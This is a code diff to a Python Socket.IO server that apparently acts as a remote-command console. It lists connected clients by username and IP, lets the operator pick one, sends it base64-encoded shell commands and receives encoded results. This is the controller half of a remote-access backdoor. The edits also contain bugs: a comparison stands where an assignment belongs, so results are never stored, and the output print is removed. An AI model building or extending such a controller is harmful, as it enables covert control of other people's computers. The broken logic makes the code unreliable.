@@ -20,6 +20,14 @@ def disconnect(sid):
             clients.remove(client)
 
 @socket.event
+def result(sid, message):
+    decoded_msg = base64.b64decode(message).decode()
+    for client in clients:
+        if client["sid"] == sid:
+            client["result"] == str(decoded_msg)
+            print("Set result to: ", str(decoded_msg))
+
+@socket.event
 def init(sid, message):
     data = json.loads(message)
     for client in clients:
@@ -31,7 +39,7 @@ threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False))
 os.system("clear")
 
 while True:
-    commands = ["clients", "select"]
+    commands = ["clients", "connect"]
     cmd = input("> ")
     if cmd.split(" ")[0] not in commands:
         print("Command not found")
@@ -44,7 +52,7 @@ while True:
         if not clients:
             print("No clients found")
 
-    if cmd.split(" ")[0] == "select":
+    if cmd.split(" ")[0] == "connect":
         if len(cmd.split(" ")) > 1:
             client_select = int(cmd.split(" ")[1])
             client = clients[client_select]
@@ -52,10 +60,10 @@ while True:
                 sess_cmd = input(f"{client['username']}@{client['ip']} > ")
                 socket.emit("command", base64.b64encode(sess_cmd.encode()))
                 while True:
-                    if client.get("result", False):
-                        print(client["result"])
+                    if client.get("result", None):
                         client["result"] = None
                         break
+                    time.sleep(0.3)
             except KeyboardInterrupt:
                 print("Exiting session")
         else:
